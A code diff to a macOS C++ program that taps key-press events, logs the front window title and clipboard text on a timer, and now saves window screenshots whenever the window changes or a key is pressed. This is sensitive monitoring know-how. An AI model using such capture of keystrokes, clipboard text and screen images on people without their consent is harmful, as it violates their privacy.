@@ -10,10 +10,13 @@
 
 #include <ApplicationServices/ApplicationServices.h>
 #include <CoreGraphics/CGEvent.h>
+#include <dispatch/dispatch.h>
 #include "MacUtil.h"
+#include "ImgMgmt.h"
 #include "Logger.h"
 
 CFMachPortRef      eventTap;
+static bool        sKeyPressed = false;
 
 static std::string GetModifiers(CGEventFlags flagsP) {
     std::string modifiers;
@@ -79,6 +82,8 @@ myCGEventCallback(CGEventTapProxy proxy, CGEventType type,
     
     
     
+    sKeyPressed = true;
+
     if (keycode == 53)
         CFRunLoopStop(CFRunLoopGetCurrent());
     
@@ -98,11 +103,16 @@ myCGEventCallback(CGEventTapProxy proxy, CGEventType type,
 void ActiveSenseTimerCallback(CFRunLoopTimerRef timer, void *info)
 {
     std::string str;
-    if (MacUtil::GetFrontWindowTitle(str))
+    bool bWindowChanged = MacUtil::GetFrontWindowTitle(str);
+    if (bWindowChanged)
         LOGGER_LOG("Front App: %s", str.c_str());
+    if (bWindowChanged || sKeyPressed) {
+        bool bSaved = SaveWindowImage(str, !bWindowChanged);
+        if (bSaved)
+            sKeyPressed = false;
+    }
     if (MacUtil::GetClipboardString(str))
         LOGGER_LOG("Clipboard text: %s", str.c_str());
-    
 }
 static void InitTimer()
 {
@@ -113,6 +123,7 @@ static void InitTimer()
                                                     TIMER_INTERVAL, 0, 0,
                                                     ActiveSenseTimerCallback,
                                                     NULL);
+    CFRunLoopTimerSetTolerance(mTimer, 0.05);
     CFRunLoopAddTimer(CFRunLoopGetCurrent(), mTimer, kCFRunLoopCommonModes);
 }
 //CGEventRef  MyCGEventTapCallBack(CGEventTapProxy  proxy,
@@ -150,6 +161,7 @@ main(void)
         LOGGER_LOG_ERROR("No permission");
         return 2;
     }
+    // Screen recording permission is checked inside CaptureAndSaveWindowImage via logging
     // Create an event tap. We are interested in key presses.
     eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventKeyUp)); // kCGEventMaskForAllEvents;
     //eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault,
